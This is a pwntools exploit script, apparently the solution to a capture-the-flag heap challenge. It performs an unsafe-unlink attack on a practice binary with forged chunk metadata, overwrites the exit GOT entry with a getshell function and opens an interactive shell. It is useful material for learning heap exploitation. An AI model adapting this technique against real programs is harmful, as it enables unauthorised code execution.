# unlink2.py
from pwn import *

p = process("./unsafe_unlink2")

def add(data):
	p.sendlineafter(b">",b"1")
	p.sendlineafter(b":",data)
	
def free(idx):
	p.sendlineafter(b">",b"2")
	p.sendlineafter(b":",str(idx).encode())
	
def edit(idx, size, data):
	p.sendlineafter(b">",b"3")
	p.sendlineafter(b":",str(idx).encode())
	p.sendlineafter(b":",str(size).encode())
	p.sendlineafter(b":",data)
	
def exit_func():
	p.sendlineafter(b">",b"4")
	
elf = ELF('./unsafe_unlink2')

heap_ptr = elf.symbols['ptr']
shell = elf.symbols['getshell']
exit = elf.got['exit']

third_heap_ptr = heap_ptr+16

add("AAAA")
add("AAAA")
add("AAAA")
add("AAAA")

payload = p64(0)
payload += p64(0)
payload += p64(third_heap_ptr-24) # P->fd->bk == P
payload += p64(third_heap_ptr-16) # P->bk->fd == P
payload += b"A"*0xe0
payload += p64(0x100) # prev_size
payload += p64(0x110) # inuse 0

edit(2, 0x130, payload)

free(3)

payload = p64(0)
payload += p64(exit) # ptr 0
edit(2, 16, payload)

edit(0, 8, p64(shell))

exit_func() # getshell

p.interactive()
